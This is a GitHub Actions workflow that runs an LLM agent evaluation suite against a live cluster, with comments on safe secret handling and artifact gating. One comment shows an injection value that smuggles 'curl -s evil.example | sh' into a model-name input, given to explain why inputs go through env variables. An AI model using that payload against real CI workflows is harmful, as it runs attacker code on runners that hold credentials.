name: Live evaluation (manual)

# The model-dependent half of the test suite: the MLflow suites driven against a
# running cluster and a real LLM.
#
# Manual only, and required by nothing. It exists so the command is recorded and
# runnable rather than folded into the pull-request gate, for two reasons:
#
#   * it needs a model endpoint, which means a credential this repository does
#     not have and a public fork must never be asked for;
#   * it is non-deterministic — the figures move between runs of the same model.
#
# Without inputs this workflow does nothing but say so. It never reads a secret
# implicitly: the endpoint is supplied per run and the key comes from a named
# environment that is absent by default.

on:
  workflow_dispatch:
    inputs:
      llm_base_url:
        description: "OpenAI-compatible base URL, e.g. https://api.openai.com/v1"
        required: true
        type: string
      llm_model:
        description: "Chat model to evaluate"
        required: true
        default: "qwen3:8b"
        type: string
      suite:
        description: "Suite to run"
        required: true
        default: "all"
        type: choice
        options: [all, guardrails, tools, grounding, injection]

permissions:
  contents: read

jobs:
  live:
    name: ${{ inputs.suite }} suite
    runs-on: ubuntu-latest
    # A hung endpoint must not burn a whole runner day.
    timeout-minutes: 120
    # Holds LLM_API_KEY. Absent by default, and absent on a fork, which is the
    # intended state: this workflow is not runnable without deliberate setup.
    environment: live-evaluation
    steps:
      - uses: actions/checkout@v4

      # Every free-text input is passed through `env:` and referenced as a shell
      # variable, never interpolated into the script body.
      #
      # This is not a style preference. `${{ inputs.llm_model }}` expanded
      # directly inside a `run:` block is textual substitution *before* the shell
      # sees the script, so a model name of
      #     x"; curl -s evil.example | sh; echo "
      # executes on the runner with the job's token. `type: string` constrains
      # nothing. The `suite` input is a `choice` and therefore already bounded,
      # but it goes through env as well so the rule holds uniformly and nobody
      # has to re-derive which inputs are safe.
      - name: Create .env
        env:
          LLM_BASE_URL: ${{ inputs.llm_base_url }}
          LLM_MODEL: ${{ inputs.llm_model }}
          LLM_API_KEY: ${{ secrets.LLM_API_KEY }}
        run: |
          set -euo pipefail
          cp .env.example .env
          # printf with %s, so a value containing shell metacharacters is data.
          {
            printf 'LLM_BASE_URL=%s\n' "$LLM_BASE_URL"
            printf 'LLM_MODEL=%s\n' "$LLM_MODEL"
            printf 'LLM_GUARD_MODEL=%s\n' "$LLM_MODEL"
            printf 'LLM_API_KEY=%s\n' "${LLM_API_KEY:-not-set}"
            printf 'LLM_REASONING_EFFORT=\n'
            printf 'LLM_GUARD_REASONING_EFFORT=\n'
          } >> .env
          # Never `cat .env`: it holds the key. Confirm the shape only.
          echo "Wrote .env with $(grep -c '^LLM_' .env) model settings."

      # evaluation/results is gitignored, so nothing is checked in — but a
      # leftover file from a cached workspace would be uploaded below and read as
      # this run's output. Start from empty and record the fact.
      - name: Ensure the results directory is empty
        run: |
          set -euo pipefail
          rm -rf evaluation/results
          mkdir -p evaluation/results
          echo "results_started_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$GITHUB_ENV"

      - name: Start the cluster
        run: make up-build

      - name: Wait for health
        run: make wait

      - name: Report what is actually running
        run: make version

      - name: Bootstrap the MLflow datasets
        env:
          SUITE_INPUT: ${{ inputs.suite }}
        run: make eval-bootstrap SUITE="$SUITE_INPUT"

      # ALLOW_FAILURES=1 suppresses the *metric* gate only. It does not suppress
      # an infrastructure failure: an unreachable agent, a missing dataset or a
      # dead model raises out of the runner and this step fails regardless. That
      # separation is the whole reason the flag exists — a red metric is a
      # published finding, a broken cluster is a broken build, and the two must
      # not report identically.
      - name: Run the suites
        env:
          SUITE_INPUT: ${{ inputs.suite }}
        run: make eval SUITE="$SUITE_INPUT" ALLOW_FAILURES=1

      # The single gate that decides whether anything gets published. Runs on
      # `always()` so a crash in "Run the suites" (an infra failure — a metric
      # failure never reaches this step failed at all, thanks to
      # ALLOW_FAILURES=1 above) does not skip validation of whatever partial
      # results were produced before the crash. Distinguishes missing,
      # malformed, stale and credential-bearing results from an eligible run
      # through `scripts/verify_evaluation_artifacts.py`'s `outcome` output —
      # see that script for exactly what each one means and why the check is a
      # small, independently testable script rather than inline shell.
      #
      # `results_started_at` was written to GITHUB_ENV above, and a credential
      # scan must never echo the value it is scanning for, so both go through
      # `env:`/the script's own withheld-value diagnostics, never
      # string-interpolated into the command.
      - name: Validate result artifacts
        id: validate
        if: always()
        env:
          LLM_API_KEY: ${{ secrets.LLM_API_KEY }}
        run: |
          set -uo pipefail
          MCP_API_KEY_VALUE="$(grep -m1 '^MCP_API_KEY=' .env 2>/dev/null | cut -d= -f2- || true)"
          python3 scripts/verify_evaluation_artifacts.py evaluation/results \
            --started-after "${results_started_at:-}" \
            --secret "${LLM_API_KEY:-}" \
            --secret "${MCP_API_KEY_VALUE:-}" \
            --github-output "$GITHUB_OUTPUT"

      # Gated on the validator's own outcome and output, not on the job's
      # overall status and not on `always()`.
      #
      # A bare custom expression like `steps.validate.outputs.eligible ==
      # 'true'` is not the whole condition GitHub Actions evaluates: unless
      # the expression itself contains always()/cancelled()/failure()/
      # success(), GitHub silently ANDs it with an implicit success() over
      # the *job so far* (see "Evaluate expressions in workflows and
      # actions" in the Actions docs). "Run the suites" failing (an infra
      # failure) makes that implicit success() false, which would block this
      # upload even when "Validate result artifacts" ran under `always()`
      # and legitimately reported eligible=true — silently reintroducing the
      # exact bug this gate exists to close. `!cancelled()` supplies the one
      # required status function without itself restricting anything (a run
      # this job did not cancel keeps evaluating the rest of the condition),
      # and `steps.validate.outcome == 'success'` checks the validator step
      # itself rather than inferring its health from the job's aggregate
      # status. A step that never ran or that failed leaves both `outcome`
      # and `outputs.eligible` unable to satisfy this, exactly like an
      # explicit rejection does. Nothing rejected or unvalidated is ever
      # uploaded, a run that only partially completed can still publish the
      # (validated) results it does have, and the job's own failure status
      # from "Run the suites" is untouched by any of this — this condition
      # only decides whether an upload *step* runs, not whether the job
      # overall succeeded.
      - name: Upload the results
        if: ${{ !cancelled() && steps.validate.outcome == 'success' && steps.validate.outputs.eligible == 'true' }}
        uses: actions/upload-artifact@v4
        with:
          name: evaluation-results-${{ inputs.suite }}
          # Deliberately narrow. A broader path could pick up .env.
          path: evaluation/results/*.json
          if-no-files-found: error

      # Not `make logs-app`: that follows the stream and would never return.
      - name: Cluster logs on failure
        if: failure()
        run: docker compose logs --no-color --tail=300 postgres mcp-server agent gateway ui

      # Containers and networks only. Volumes are deliberately left alone: a
      # `down -v` here would delete the MLflow history this workflow exists to
      # accumulate.
      - name: Tear down
        if: always()
        run: make down
